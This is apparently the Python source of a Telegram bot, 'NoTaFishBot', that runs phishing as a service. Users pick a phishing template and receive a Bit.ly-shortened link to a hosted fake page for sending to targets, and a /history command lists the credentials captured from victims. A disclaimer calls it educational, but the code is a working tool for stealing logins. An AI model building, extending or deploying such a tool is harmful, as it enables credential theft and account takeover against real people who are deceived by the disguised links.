import telebot
from telebot import types
import time
import logging

from template_manager import get_available_templates, prepare_template
from url_shortener import shorten_url
from creds import get_user_history


logger = logging.getLogger(__name__)

# Dictionary to store user states if needed for multi-step operations
user_states = {}

# Global variables
is_bot_running = False

#Commands for bot
def setup_bot_handlers(bot):
    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        bot.reply_to(message, (
            "🎣 Welcome to NoTaFishBot!\n\n"
            "Commands:\n"
            "/fish - Start phishing\n"
            "/templates - List available templates\n"
            "/history - View your captured credentials\n"
            "/guidelines - User's Guidelines\n"
            "/info - Bot and owner information\n"
        ))

    # Command handler for /info
    @bot.message_handler(commands=['info'])
    def send_info(message):
        bot.reply_to(message, "It is a Educational Phishing Bot.\n"
                              "Created by:- Github: youutubee\n"
                              "Github link:- https://github.com/youutubee/NoTaFish\n"
                              "Please star the repo if you find it helpful\n")

    @bot.message_handler(commands=['guidelines'])
    def send_info(message):
        bot.reply_to(message, "Use this bot for only Ethical and Educational purposes\n "
                              "Using this bot for malicious or bad practice it a criminal Offense\n")

    # Command handler for /templates
    @bot.message_handler(commands=['templates'])
    def list_templates(message):
        templates = get_available_templates()
        if templates:
            template_list = "\n".join([f"• {template}" for template in templates])
            bot.send_message(message.chat.id, f"📋 Available templates:\n\n{template_list}\n\nUse /fish to select one.")
        else:
            bot.send_message(message.chat.id, "❌ No templates found. Please add templates to the Templates directory.")

    # Command handler for viewing credential history
    @bot.message_handler(commands=['history'])
    def view_history(message):
        user_id = str(message.chat.id)
        history = get_user_history(user_id)

        if history['success']:
            if history['count'] > 0:
                bot.send_message(user_id, f"📊 You have captured {history['count']} credential set(s).")

                # Send the most recent captures
                for i, cred in enumerate(history['recent']):
                    # Format each credential set
                    msg = "\n".join(f"{k}: {v}" for k, v in cred.items())
                    bot.send_message(user_id, f"📝 Capture {i + 1}:\n\n{msg}")
            else:
                bot.send_message(user_id, "📭 You haven't captured any credentials yet.")
        else:
            bot.send_message(user_id, "📭 No credentials history found.")

    # Command handler for /fish
    @bot.message_handler(commands=['fish'])
    def send_fish_menu(message):
        # Get available templates
        templates = get_available_templates()

        if not templates:
            bot.send_message(message.chat.id, "❌ No templates found. Please add templates to the Templates directory.")
            return

        # Create a custom keyboard with template options
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
        buttons = [types.KeyboardButton(template) for template in templates]
        markup.add(*buttons)
        bot.send_message(message.chat.id, "📄 Choose a phishing template:", reply_markup=markup)

    # Message handler for template selection
    @bot.message_handler(func=lambda msg: msg.text in get_available_templates())
    def handle_template_selection(message):
        template = message.text
        user_id = str(message.chat.id)
        bot.send_message(message.chat.id, f"⚙️ Generating phishing page for {template}...")

        # Prepare the template
        result = prepare_template(template, user_id)

        if result['success']:
            # Generate long URL first
            long_url = f"https://notafish.onrender.com/view/{user_id}"

            # Shorten the URL using Bit.ly API
            short_url = shorten_url(long_url)

            # If URL was successfully shortened
            if short_url != long_url:
                bot.send_message(message.chat.id,
                                 f"✅ Done!\nSend this shortened link:\n{short_url}\n\nOriginal link:\n{long_url}")
            else:
                bot.send_message(message.chat.id, f"✅ Done!\nBit.ly shortening failed. Send this link:\n{long_url}")
        else:
            bot.send_message(message.chat.id, f"❌ Error: {result['error']}")

    # Default message handler for unrecognized commands
    @bot.message_handler(func=lambda m: True)
    def fallback(m):
        bot.reply_to(m, "❓ Unknown command. Use /start")


def run_bot_polling(bot):
    """Run the bot polling in a thread with error handling"""
    global is_bot_running

    if is_bot_running:
        logger.warning("Bot is already running, skipping...")
        return

    is_bot_running = True
    logger.info("Starting bot polling...")

    try:
        bot.remove_webhook()
        time.sleep(0.5)  # Give time for webhook to be removed
        bot.infinity_polling(timeout=60, long_polling_timeout=30)
    except Exception as e:
        logger.error(f"Bot polling error: {e}")
    finally:
        is_bot_running = False
        logger.info("Bot polling has stopped")